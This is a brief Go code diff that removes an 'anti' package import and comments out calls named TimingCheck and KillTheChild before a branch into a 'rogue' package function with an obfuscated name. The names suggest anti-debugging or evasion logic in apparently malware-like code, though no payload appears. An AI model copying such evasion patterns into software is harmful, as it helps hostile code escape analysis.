@@ -1,7 +1,6 @@
 package main
 
 import (
-	"NULL/0x27894365/base_config/anti"
 	"NULL/0x27894365/base_config/rogue"
 	"NULL/0x27894365/base_config/shared"
 	"crypto/sha256"
@@ -77,8 +76,8 @@ startpoint:
 	secureFunc := shared.NewSecureFunction(seed)
 	initCouner := secureFunc.DeriveCount()
 
-	q.TimingCheck()
-	q.KillTheChild()
+	//q.TimingCheck()
+	//q.KillTheChild()
 	switch BB23598623() {
 	case true:
 		rogue.Func549687354()
